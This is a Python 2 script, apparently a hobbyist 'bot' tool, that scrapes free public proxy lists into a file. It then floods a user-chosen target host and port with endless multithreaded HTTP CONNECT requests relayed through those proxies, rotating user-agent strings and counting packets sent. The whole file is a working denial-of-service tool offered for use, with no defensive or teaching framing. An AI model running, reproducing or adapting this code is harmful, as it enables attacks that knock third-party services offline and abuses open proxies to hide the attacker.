import socket,random,threading,requests,re
link=["https://www.us-proxy.org/","https://free-proxy-list.net/"]
def WriteFile(str):
    with open("bots.txt" ,"a") as f:
        f.write(str+'\n')
        return     
        
def rc():
 global w
 w=[]
 f=open("bots.txt", "r")
 global fl
 fl =f.readlines()
 for x in fl:
  if x not in w:
   w.append(x)
 return w

with open("bots.txt", "a+") as f:
        f.close() 

def r(l):
 response = requests.get(l).text 
 return re.findall(r"<tr><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td class='hm'>[^<]*</td><td>[^<]*</td><td class='hm'>[^<]*</td><td class='hx'>[^<]*</td><td class='hm'>[^<]*</td></tr>", response)

def mr():
 v=0
 global lis
 lis=[]
 while v<2:
  for l in link:
   try:
    lis+=r(l)
    v+=1
   except Exception as e:
    print e

def ma():
 mr()
 for match in lis:
  result = match.split('</td>') 
  ip = result[0].strip('<tr><td>') 
  p= result[1].strip('</td>') 
  prox=ip+':'+p
  WriteFile(prox)
  w.append(prox)
 return w
 
b=0
while b<1:
 rc()   
 print'\033[92m\n\nCoded by S0u1 and Pr0t0x1c'
 print'\033[92m\n\n Set Sail WizE oNe'
 print'\033[92m\n\nPrOxiEs YoU hAvE:',len(fl)
 print'\nUnIqUe PrOxIeS:',len(w)
 k=input('\ndo you want to get more?\n 1-yes\n 2-no\n>')
 if k==1:
  print'\n\n\033[92m[+]gathering...'
  ma()
  print '[+]done!!!\n\n'
 elif k==2:
  b+=1


i=0

ua=['Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)']
host=raw_input('\n\n\033[92mTARGET:\n>')
port=input('\nPORT:\n>')
ti=input('\nTIMEOUT:\n>')
th=input('\nTHREADS:\n>')
get_host = "CONNECT "+host+":"+str(port)+" HTTP/1.1\r\nHost: " + host + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"

def so():
 global i
 line=random.choice(w)
 ip=line.split(':')[0].split('=')[0]
 p=line.split(':')[1].split('=')[0]
 useragent = "User-Agent: " + random.choice(ua) + "\r\n"
 httprequest = get_host + useragent  + accept + connection + "\r\n"
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(ti)
  s.connect((ip,int(p)))
  s.send(httprequest)
  i+=1
  print'\033[92mBoT: {}:{}\033[91m PaCkEt: {}'.format(ip,str(p),i)
 except socket.error as e:
  pass
  
class prx(threading.Thread):
	def run(self):
	 while True:
		try:
		 so()
		except Exception as e:
			pass
			
for x in range(th):
  t= prx()
  t.start()